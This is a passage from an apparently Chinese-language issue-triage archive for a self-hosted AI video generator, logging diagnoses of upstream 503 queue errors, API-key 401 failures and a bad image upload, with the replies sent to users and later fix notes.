续传（分镜/参考图保留不重提交）＋降载（更少场景/更短时长/更小分辨率）＋换视频模型（队列按模型分池）＋多 Key 线性提配额。**本轮无代码改动，非缺口**（与裸 503 待办对照，本例证明带 code 的队列轨道已生效）。附带：报告中 `Style: 电影质感写实风格` 是后端硬编码中文默认值泄漏到 en 界面任务（`task_creation_routes.py` Form 默认 + FastAPI 把空串视作缺省重填、`models/task.py` pydantic 默认、`scenes.py` screenwriter 兜底），属数据非语言判据，另列改进 | #87 |
| creative 任务在 `end_frame_gen` 失败（**7.0.5** / Windows），`errorMessage` 为 `PIL.UnidentifiedImageError: cannot identify image file '…\\.working_dir\\uploads\\{task_id}_end_1.png'`，`Retry Count: 4`（四次重试同一环节同一错误），报告 **Idioma de la interfaz: es** | **用户上传的自定义尾帧文件本身不是可解码图片**（机制已核实到行，字节级成因待用户补数据）。链路：`use_custom_end_frames` 时逐段尾帧由 `web/routes/task_creation_routes.py:379` 经 `_save_upload_file`（同文件 149–161）落盘为 `uploads/{task_id}_end_{idx}.png`——**只校验扩展名白名单、不校验内容**，且非白名单后缀一律静默改写为 `.png`（`.heic` / `.avif` / `.tif` 会变成「后缀撒谎」的 png）；流水线 `core/pipelines/creative/steps_frames.py:222` 调 `normalize_image_async` → `utils/image_normalizer.py:83` 的 `Image.open` 抛 `UnidentifiedImageError`（`OSError` 子类）直接冒到 `multi_scene.py:108` 打死任务。对照：同模块 126 行的安全封装 `normalize_reference_path` 才吞 `OSError`，此处用的是会抛的裸版本。失败在任何视频提交之前，**未生成、未消耗配额**。**坏路径持久化在 `state.end_frame_images`，所以「重试任务」每次都读同一个坏文件 → `Retry Count: 4` 是必然，不换文件不可能通过**。字节级三种可能未定：(a) 真格式为 HEIC/AVIF/TIFF 被改名（PIL 需 `pillow-heif` 才能解，本项目未装）；(b) 文件截断/0 字节——注意前端 `CreativeForm.vue:148` 有 `f.size > 0` 过滤，0 字节理论上不该进来，若确认 0 字节说明走了别的入口或旧版本；该过滤还有个副作用：**跳过空文件但不补位，多张图时造成 idx 与场景错位**（另一潜在缺口）；(c) 落盘后被杀软/图像优化工具改写 | 按 §4.1 以**西班牙语**回复（`Idioma de la interfaz: es` 行为最强信号；报告结构字段是英文但不采信，再次印证 §4.1 陷阱）。回复口径（用户明确要求，已固化进本节 §4.2）：**只给推测 + 请用户确认，不向用户讲代码逻辑与因果推导**。实际发出三段：① 一句推测（「场景 2 上传的尾帧不是可读图片，最可能原文件本非真 PNG（HEIC/AVIF/TIFF）或截断/空文件」）+ 未消耗配额 + 「重试无效，要换文件新建任务」；② 两条即时出路（Paint 另存为真 PNG 后重建任务；或关「Fotogramas finales personalizados」改用 i2i 生成尾帧）；③ 索取确认信息（PowerShell 打印 `.Length` 与前 16 字节签名、Paint/Fotos 能否打开、图片来源与原文件名），并承诺「若文件确为完整 PNG 则是我们 bug，会修」。**本轮不改代码，等信息回来再定**。待办缺口已记录：① 上传时即校验图片可解码，报错按 UI 语言并带场景序号，不要拖到 `end_frame_gen`；② `steps_frames.py` 两处裸 `normalize_image_async` 应给可读错误（`error.image_unreadable` 类）或降级为「该场景改用 i2i 生成尾帧」+ warning，避免一个坏文件锁死整任务；③ 非白名单后缀静默改写 `.png` 应改为拒绝；④ 前端 `size > 0` 过滤造成的场景/图错位。FAQ 候选条目：「上传的尾帧/参考图报 `cannot identify image file`」 | #88 |
| creative 任务在 `video_gen` 失败（**7.0.5** / Windows / Chrome 153），`errorMessage` 为 `[AgnesVideo] keyframes (2 frames): max retries (5) exceeded`；报告 **UI Language: en**，768×1152 / keyframes / `Retry Count: 3`；`Model call error` 1–5 是**图片**侧裸 503（`HTTP 503: server error`，12:56–13:00），6–7 是**视频提交** 503 且 body `message` 为 `No available channel for model agnes-video-v2.0 under group default (distributor)`（13:10 起），报告尾部被反馈工具截断（只到 error 7） | #80/#81/#83/#84 那条「裸 503 只享 5 次普通配额（≈5.5 分钟）」缺口的**第 5 例**，但修复**已于 2026-10-09 随 v7.1.0 发布**（`core/api/retry_policy.py`：所有 503 归忙轨、`AGNES_VIDEO_BUSY_RETRY_ATTEMPTS` 默认 15、裸 503 已有单测），用户 7.0.5 尚未包含——即本例不需再改代码，按「外部故障 + 引导升级」处理。**新信号记录**：503 的 body `message` 可以是网关「该模型无可用渠道」而非 `video_queue_full`；且同任务图片与视频**同时** 503，说明是上游整体过载/渠道不可用时段，不是视频队列单独饱和。被拒发生在入队前，未创建任务、未消耗配额 | 英文回复（UI Language: en，标注 agent）：判定上游容量故障＋未生成未消耗＋升级到 v7.1.0（`git pull && ./start.sh` / `docker pull ghcr.io/lcy362/free-short-video:7.1.0` / `npx free-short-video`）＋Retry Task 从 `video_gen` 续传（分镜与参考图保留不重提交）＋降载/换视频模型/错峰；并请升级后错峰复测——若仍持续返回 `No available channel` 即视为我们的 bug 再查（该信号与队列满不同，忙轨只能覆盖「渠道稍后恢复」；渠道长期缺失时 15 次仍会耗尽并抛通用技术报错）。回复后关闭为已答复。**本轮无代码改动**；上游新签名已补进 `docs/dev/agnes_video_upstream_behavior.md` §4 表 | #92 |
| creative 任务在 `story` 失败（**7.1.0** / npx 部署 / Windows），`errorMessage` 为 `401 Client Error: Unauthorized for url: https://api.agnes-ai.cn/v1/chat/completions`，报告 **UI Language: en**，`Retry Count: 1`，2 次 chat 401（间隔 38s）后止 | 既有 401 同族（#38/#44/#58/#61/#62/#72/#73/#82/#86）的 **npx 变体第二例**（新用户，非 #82 复发）：请求打到国内站域名 `api.agnes-ai.cn` 被拒＝Key 与域名不匹配（国际站 Key 配国内站域名或反之；Key 过期/抄写带头尾空格）。npx 放大因素同 #82：`CONFIG_DIR` 硬编码在包目录 `.agnes_config`（npm 缓存内），`npm cache clean` 或缓存目录变化即丢配置回退默认域名；`AGNES_API_KEY` 系统环境变量优先级高于 `.env` 的老问题依旧 | 英文回复（UI Language: en，标注 agent）：401＝Key 未被所请求站点接受、story 为首步未生成未消耗；引导 Web 配置页删 Key 重加 + 「自动探测域名」绑定、自查 `GET {root}/v1/models`、排查 `AGNES_API_KEY` 环境变量、排查期只留一把 Key、npx 清缓存后重配、恢复后 Retry Task 从 `story` 续传。**CONFIG_DIR 改进（env 覆盖 / npx 用户级配置目录）继续挂待办**——本例为第二数据点，出现第三例时建议提级实施 | #93 |
| creative 任务在 `video_gen` 失败（**7.1.0** / 本地 git 仓库部署 / Windows），`errorMessage` 为 `[AgnesVideo] keyframes (2 frames): upstream busy (HTTP 503 · model_not_found) after 15 retries / 908s; no job was created`；报告 **UI Language: en**，768×1152 / 3 场景 / keyframes，`Retry Count: 4`；`Model call error` 前段为图片侧 `Busy503 server busy`（20:41–20:42），后段全部为视频提交 503 `No available channel for model agnes-video-v2.0 under group default (distributor)`（20:45 起） | #92 的「No available channel」签名在 v7.1.0 上的**首个持续案例**：忙轨按设计跑满 15 次/908s 后抛通用技术报错，用户 4 次手动重试各开新 15 分钟窗口仍撞同墙，**持续 >1h 渠道缺失**；同任务图片侧同时 503，证实当晚上游整体容量紧张而非视频队列单独饱和。#92 回复时承诺的「持续出现即视为我们的 bug 再查」触发，但本轮按维护者决策**跳过上游探测**、按外部容量故障处理 | 英文回复（UI Language: en，标注 agent）：上游容量故障＋未生成未消耗＋设置有效＋忙轨 15 分钟按设计工作；引导错峰重试、Retry Task 从 `video_gen` 续传、降载、换视频模型（注明 2.5 Flash 为付费需余额）、多 Key；并请「不同时段仍持续 No available channel 就重开报告」，以区分当晚长故障与模型对用户分组长期不可用。**待办缺口（记录不改码）**：`model_not_found` 耗尽文案沿用通用 `upstream busy` 技术报错，未比照 `video_queue_full` 给结构化异常 + 22 语言「该模型暂无可用渠道，建议换视频模型」引导；若后续确认上游长期下架/分组限制，需评估前端明示 | #94 |
| simple/creative 视频任务卡在 `video_gen` ~10%（**7.1.0** / Windows / 本地部署 / 国际站），两族 503 并存：`agnes-video-v2.0` → `model_not_found`（No available channel ... under group default (distributor)），`agnes-video-2.5-flash` → `video_queue_full`；**手写英文报告**（非模板），明确两问：免费视频模型是否仍对国际站 Key 可用、`video_queue_full` 反复重试是否预期 | **v2.0 已被上游网关除名（2026-10-14 实测坐实，见 `docs/dev/agnes_video_upstream_behavior.md` §4.0.2）**：`GET /v1/models` 目录无 v2.0，提交 503 `model_not_found`，维护者 `angel` 组与用户 `default` 组均复现 → 非分组、非用户配置问题，忙轨 15 次重试注定耗尽；目录新增 `agnes-video-2.5` 实测 403 付费（与 v6.2.0 release notes 一致）；`video_queue_full` 同 #47/#63 族容量问题。**应用侧 DEFAULT_VIDEO_MODEL、6 条流水线默认值、AGENTS.md / features / architecture 的「v2.0 免费」文案待适配**（用户决策：本轮仅记档，另开批次） | 英文回复（标注 agent；**口径按维护者指示从短**：2.5-flash 与收费无关，不提余额判断）：v2.0 上游已不可用、非本地配置问题（附两组复现证据）；`video_queue_full` 重试属预期——建任务前被拒、不生成不消耗；出路＝任务设置切 `agnes-video-2.5-flash` + 错峰重试（北京 22:00–01:00 / 06:00–09:00）；承诺持续跟踪免费模型是否恢复。回复后关闭为已答复 | #95 |
| creative 任务在 `video_gen` 失败（**7.0.5** / Windows / Chrome 154），`errorMessage` 为 `[AgnesVideo] keyframes (2 frames): max retries (5) exceeded`，`Retry Count: 3`，报告 **Idioma de la interfaz: es**，1280×720 / keyframes / 5s；13 条 `Model call error` **全部为图片侧** `HTTP 503: server error`（22:52:15–22:57:50）；traceback 证实崩溃在 `agnes_video.py:835` 的 `raise RuntimeError(... max retries ...)`，即**故障轨**（`>=500` 且非忙）而非 `AgnesQueueFullError` | #80/#81/#83/#84 裸 503 缺口在 **7.0.5** 上的**第 6 例**，修复已在 v7.1.0（所有 503 归忙轨、15 次、首跳 0s），用户版本早于修复——**无需再改代码**，按「外部故障 + 引导升级」处理。图片/视频同为 503 说明上游整体过载。另注两点：① 报告自述「12 条」而实际 13 条，属反馈工具截断（既有现象）；② `Engine: Chrome 154` 为 Google 滚动发布通道，非应用问题 | **西班牙语**回复（`Idioma de la interfaz: es` 行判定；报告模板键 `fbRep*` 为英文但按 §4.1 不采信）：一句推测（上游饱和）+ 未建任务未消耗配额 + 明确告知「7.0.5 只重试约 5 分钟、v7.1.0+ 已放宽到约 15 分钟」并给出三条升级命令 + Retry Task 从 `video_gen` 续传（保留关键帧不重提交）+ 错峰时段（应用内按本地时区显示）+ 降载/换模型 + 承诺升级后仍失败带新 Task ID 再来。回复后关闭为已答复。**本轮无代码改动** | #96 |
| creative 任务在 `video_gen` 失败（**7.1.1** / npx 部署 / Windows / Chrome 155），`errorMessage` 为 `Agnes video queue is full (HTTP 503 · video_queue_full); after retrying for 15 min the job never entered the queue…`；报告 **UI Language: en**，768×1152 / 5 场景 / keyframes，`Retry Count: 2`；traceback 为 `agnes_video.py:726` `raise AgnesQueueFullError`（`after 902s of retrying`），同任务图片侧 503 `Busy503 server busy`（15:37–15:39） | **队列忙轨按设计工作的正向案例**，与 #98 同一签名（`video_queue_full` + 902s ≈ 15 次忙轨）。用户 2 次手动重试各开新 15 分钟窗口仍满，说明当晚上游免费队列饱和持续 >45 分钟；图片侧同时 503 说明是上游整体容量紧张。被拒发生在入队前，未建任务、未消耗配额。**无代码缺口**（`AgnesQueueFullError` 已带 22 语言 `error.video.queue_full` 文案与换模型引导，见 `en.json:56`） | 英文回复（UI Language: en，标注 agent）：判定上游队列饱和＋未生成未消耗＋7.1.1 行为符合设计（重试约 15 分钟属预期，2 次手动重试只是各开新窗口）+ 错峰（应用内按本地时区显示时段）+ Retry Task 从 `video_gen` 续传（分镜/参考图保留不重提交）+ 降载 + 换视频模型（队列按模型分池）。按维护者决策**未提** npx 缓存丢配置（用户选择不展开）。**本轮无代码改动** | #97 |
| creative 任务在 `video_gen` 失败（**7.1.1** / Windows / Chrome 155），`errorMessage` 为中文「Agnes 视频队列已满（HTTP 503 · video_queue_full），重试 15 分钟后仍未排进队…」，报告 **界面语言: zh**，768×1152 / 3 场景 / keyframes，`Retry Count: 0`，**无 traceback 与 `Model call error`**（模板字段留空） | 与 #97 同一上游签名（`video_queue_full` 满 15 分钟忙轨后放弃），**无代码缺口**，按外部容量故障处理。`Retry Count: 0` 说明用户未做手动重试；此例同时验证 v7.0 后端 i18n 生效——中文界面收到中文 `error.video.queue_full` 文案（v7.0 前为硬编码中文，英文界面亦然） | 中文回复（界面语言: zh 行判定）：判定上游容量饱和＋未生成未消耗＋7.1.1 重试 15 分钟属预期行为＋错峰（北京 22:00–01:00 / 06:00–09:00）＋点重试任务从 `video_gen` 续传（不重复提交不重复消耗）＋降载＋换视频模型。**本轮无代码改动** | #98 |
| creative 任务在 `video_gen` 失败（**7.1.1** / Windows / Chrome 155），`errorMessage` 为 `Agnes video queue is full (HTTP 503 · video_queue_full); after retrying for 53 minutes the job never entered the queue…`；traceback `core.api.agnes_video.AgnesQueueFullError: … after 3204s of retrying; no job was created`（`agnes_video.py:726`）；报告 **UI Language: en**，768×1152 / **1 场景** / keyframes，`Retry Count: 2`；6 条 `Model call error`＝图片侧 5 次 `Busy503 server busy`（18:32–18:33）+ 视频提交 1 次 `QueueFull_video_queue_full` | 与 #97/#98 **同一签名**（`video_queue_full` 忙轨耗尽），**无代码缺口**，未建任务、未消耗配额。**本例唯一新观察＝窗口长度**：3204s ≈ 53 分钟，而 #97 为 902s ≈ 15 分钟。v7.1.1 参数是 15 次 ×（30s + 0–30s 抖动）＋视频提交令牌桶 1 次/分钟/Key，单发排队理论上约 15–30 分钟，故**推测**本例每轮实等 ≈214s 是用户两次手动重试与图片/视频提交争抢同一提交桶叠加所致（`waited` 分钟数在 `error.video.queue_full` 模板里是**动态参数**，非硬编码 15，故消息与实际一致）。属排队叠加而非重试预算算错，本轮不改码 | 英文回复（UI Language: en，标注 agent）：判定上游容量饱和＋未生成未消耗＋错峰（应用内提示按浏览者本地时区显示）＋Retry Task / Resume 从 `video_gen` 续传（分镜与参考图保留不重提交）＋换视频模型（队列按模型分池）；**本例场景数已为 1，故未写「降载」，改为「一次只跑一个任务」**（提交限速 1 次/分钟/Key，并发只会拉长等待）。请用户错峰仍失败则带新 Task ID 复报。回复后连同 #97/#98（上轮已答复）一并以 `completed` 关闭 | #99 |
| creative 任务在 `story` 失败（**7.1.1** / Linux 本地目录部署 `/home/fefe/agnes-video-generator` / Opera 135·Chrome 151 / Python 3.13 venv），`errorMessage` 为 `401 Client Error: Unauthorized for url: https://apihub.agnes-ai.com/v1/chat/completions`，2 次 chat 401（间隔 26s），`Retry Count: 1`；报告 **Язык интерфейса: ru**，768×1152 / 3 场景 / keyframes | 既有 401 同族（#38/#44/#58/#61/#62/#72/#73/#82/#86/#93）**第 11 例，无新代码缺口**：Key 未通过所请求站点认证（跨站 Key / 过期 / 抄写带头尾空格）。**新变体＝方向相反**：以往两例（#82/#93）是国内站 `api.agnes-ai.cn` 被拒，本例是**国际站 `apihub.agnes-ai.com` 被拒**，即国内站 Key 配国际站域名。本例为 Linux 本地目录部署，**不含** npx 的 `CONFIG_DIR` 落在 npm 缓存被清空的放大因素（该改进已随 2026-10-15 批次落地：`AGNES_CONFIG_DIR` 可覆盖）。story 为首步，未生成、无消耗 | **俄语回复**（`Язык интерфейса: ru` 行判定；本例报告模板结构与内容键均已真译，结构语言与界面语言一致，无需按 §4.1 交叉验证）。口径（标注 agent）：一句推测（Key 与该站点不匹配 / Key 过期或带空格）＋未生成未消耗＋请用户确认属哪种；出路＝① 配置页看红色「Ошибка авторизации ×N」角标直接指认坏 Key（7.1.1 起有，已核 `v7.1.1:frontend/src/components/ConfigPanel.vue:105`）② 删 Key 重加用 «Автоопределение доменов»，或把全局 «Домен Agnes» 切到 Key 所属站点，排查期只留一把 Key ③ `.env` / `AGNES_API_KEY` 来源的 Key 不参与 per-key 域名绑定、且环境变量优先级高于 `.env` ④ `curl -H "Authorization: Bearer …" {root}/v1/models` 自查（200＝站点匹配，三站全 401＝Key 本身失效/带空格）⑤ «Продолжить» 从同步骤续传；承诺「全部 Key 均 200 却仍 401 即我们的 bug，会修」。回复后以 `completed` 关闭 | #100 |
| #97 已答复后又收到新评论（2026-10-19，`husaingurana-eng`）："I paid for the basic plan, all credits disappeared and was still overburdened." | 与原 #97 是**两件事的叠加**：(1) 503 / `video_queue_full` 的拒绝发生在**建任务之前**，按设计不消耗配额，用户两次手动重试也只是各开新窗口；(2) **计费与余额在上游 Agnes 平台侧**（国际站 `platform.agnes-ai.com` / 国内站 `platform.agnes-ai.cn`），本项目只是自托管前端，无任何账户视角。付费档只改变上游配额/优先级，**不能绕过已满的视频队列**。credits「消失」的可能来源：任务实际跑过（含跑到中途失败的片段按上游规则计费）、或用户把平台消耗算到了应用头上，本轮无法核实（无 Task ID / 无账单截图） | 英文回复（评论为英文，标注 agent）：把「未消耗」与「计费在平台侧」两件事拆开说清＋付费档不插队＋请用户在控制台核账单时间戳是否对应真实产出＋若确认「没产出却扣了额度」请给 Task ID 我们查应用侧行为＋补充上游对 2026-10-26 12:00（UTC+8）后 503/queue full 明显改善的预期。**无代码改动**（已答复，原 issue 保持 closed） | #97 |
| Discussion #102（Q&A，"error"）：截图显示一个任务停在 30%「Reference images generated」超过 30 分钟，另一个停在 0%「任务启动中…」 | 单个截图无法区分「慢」与「真卡住」。30% 处＝分镜图已出、正在等视频模型，上游连日拥塞下单段可等很久，多场景长视频整体 30–60 分钟属正常；0%「任务启动中」是前端 `taskStarting` 占位（`running`/`queued` 且尚无 `current_message`），可能只是服务端并发权重闸（`TASK_TYPE_WEIGHTS` / `MAX_CONCURRENT_WEIGHT` 默认 10）排在其他任务之后，也可能是 demo 站自身的更早客户端超时（`faq.md` 已记该差异）。信息不足，无法定位 | 英文回复（正文英文，标注 agent）：说明 30% 处当前在等视频模型、长视频 30–60 分钟可属正常＋0% 那条尚未真正开始（排队或未获槽）＋索取四项：部署方式（自托管/Docker/npx/在线 demo）、应用版本、Task ID、自托管时 `GET /api/tasks/<id>` 的 `state`/`current_message`/`error` 字段＋叮囑别删任务、失败后用 Retry Task 续传＋提示 2026-10-26 12:00（UTC+8）后队列预期改善＋承诺若确为真卡死会修。**无代码改动**，等用户补信息 | #102(discussion) |
| Issue #101「[Bug] 」正文为**完全未填写**的模板（版本 / 任务类型 / 失败环节 / 错误信息 / 复现步骤 / 期望行为全空，无 Task ID、无诊断信息） | 用户很可能点了应用内「去 GitHub 提 Issue」但没填任何字段就提交，零信息可分析，属无意义报告 | 双语（中文为主＋英文一段）一句话说明「信息为空无从判断」＋列出需补的四项（版本/任务类型/失败环节、失败面板错误信息或用应用内按钮自动带诊断、Task ID）＋提示补充后 reopen，随后以 `not planned` 关闭。**无代码改动** | #101 |
| Discussion #91（Show and tell）：标题「He Had Almost Nothing… But He Gave Everything ❤️🥹」，正文为 60 秒短视频分镜 prompt 全文，`Video URL` 仅填 `www.youtube.com` | 按 #90 投稿指南要求「公开视频链接」，该帖**没有任何可核对的作品**（仅域名），既无法收录 showcase 也无讨论价值，属灌水式 prompt 倾倒（非恶意），判定为垃圾噪音 | 按 §四「垃圾噪音：直接关闭，不展开回复」处理——Discussions 无「关闭」态，故直接 **deleteDiscussion** 删除（未留言）。**无代码改动** | #91(discussion) |

> **口径修订注（2026-10-15，加注不删改原记录）**：本表部分历史行归因与后续实测/维护者澄清不一致，在此统一修订，原行文字保留以便追溯。
>
> 1. **#79 行**（2.5 Flash 提交 403 `insufficient_user_quota`）原把根因写作「2.5 Flash 为**付费模型**、需余额」。维护者 2026-10-14 明确澄清 **2.5-flash 与收费无关**（见 `docs/dev/agnes_video_upstream_behavior.md` §4.0.2），且 2026-10-14 实测 `agnes-video-2.5-flash` 提交返回 503 `video_queue_full`（非 403 付费）。故 #79 行「付费」归因**存疑待复核**（可能源于当时分组/计费口径差异）；该行「切到免费档 `agnes-video-v2.0`」的引导亦已失效——v2.0 于 2026-10-14 被上游除名，现行出路是切 `agnes-video-2.5-flash`（见 #95 行）。
> 2. **#94 行**回复中「注明 2.5 Flash 为付费需余额」同属上述存疑口径，读者应按「2.5-flash 与收费无关」理解。
> 3. **#35 行**（Windows `scene_prompts` 报 `[WinError 2] The system cannot find the file specified`）原标「（待确认）」并等待用户补 traceback。**注**：`scene_prompts` 步骤仅 LLM 调用、本不经 ffmpeg，与 #78 的 `tts.py` 崩溃点未必同源；但 #78 行已记 2026-09-29 收口全项目 7 处裸 `ffmpeg`/`ffprobe` 调用（含 `core/audio/tts.py` 的 `[WinError 2]` 崩溃点）。据此标注为**「疑似已随 v7.1.0 的二进制解析修复覆盖，待复现后关闭」**，非确定修复。

> **A 类修复实施注（2026-10-15，加注不删改原记录）**：本表若干行原记的「待办缺口（本轮不改码）」已于 2026-10-15 批次实施，对应行原文保留以便追溯。
>
> 1. **#88 行**四条缺口全部落地——① 上传即校验图片可字节解码（PIL `verify()`）；② `steps_frames.py` 用户尾帧不可读改为按 UI 语言的 `error.image_unreadable_scene`（带场景序号），不再把裸 `PIL.UnidentifiedImageError` 抛到 `multi_scene.py` 打死任务；③ 非白名单后缀由「静默改写 `.png`」改为**硬拒绝**（`error.upload_ext_invalid`）；④ 前端「跳过空文件但不补位」导致的场景/图错位改为 `end_frame_indices_json` 按场景 index 映射（沿用既有 `reference_images_map` 约定）。涉及 `web/routes/task_creation_routes.py` / `core/pipelines/creative/steps_frames.py` / `core/i18n_backend.py` / `frontend/src/components/forms/CreativeForm.vue`。
> 2. **#82 / #93 行** `CONFIG_DIR` 待办已实施——`core/config.py` 新增 `_resolve_config_dir()`，支持 `AGNES_CONFIG_DIR` 环境变量覆盖（npx 场景可指向用户级配置目录，规避 npm 缓存清空即丢配置回退默认域名）。#93 原记「出现第三例时建议提级实施」，本批提前落地。
> 3. **#87 行**「`Style` 硬编码中文默认值泄漏到 en 界面」已收敛——后端 Form/pydantic 默认值此前已随 `5be0cfc` 改为 `""`（前端早已用语言中性英文预设预填）；本批补上 `core/screenwriter/scenes.py` 诗词风格缺省兜底改语言中性英文（原「未指定，请采用通用电影质感写实风格」→「cinematic realistic style」）。
> 4. **#94 行** `model_not_found` 忙轨耗尽未给结构化异常 + 22 语言换模型引导的待办**仍未实施**（A2 待启动）；其相邻的「默认模型适配」（#95）已随 A1 落地，见下条。
> 5. **#94 / #95 行**「默认模型适配」已于 2026-10-15 实施（A1）——`core/config.py DEFAULT_VIDEO_MODEL` 改为 `agnes-video-2.5-flash`、`VIDEO_MODEL_CAPABILITIES` 移除 v2.0 条目、5 条流水线默认值同步、`core/api/agnes_video.py::submit_video` 删除 width/height/num_frames 旧协议分支（恒走 2.5 提交，`_get_frame_config`/`DURATION_PRESETS` 随之删除）、`task_creation_routes` 时长校验收敛为 `VIDEO_25_DURATIONS`，AGENTS.md / `docs/public/features*` / `architecture*` / `usage.md` / `faq.md` / `regression_test_plan.md` 表述同步。竖屏躺倒维持现状（`AGNES_FIX_V25_PORTRAIT_ROTATION` 默认关、前端 `vmPortraitRotateHint` 文案未改）。

***

## 四、范围与后续迭代

* **本版为初版**：先跑通「查看 → 分析 → 沟通 → 回复/修复 → 归档」闭环，最小可落地。

* **后续可迭代方向**（未实现，仅记录）：

  * 自动化：定期扫描 open issue 并生成待处理清单。

  * 分类机器人：为 issue 打标签（bug / 需求 / spam）。

  * 处理 SLA 与升级机制。

  * 从归档表自动生成 FAQ 草稿。

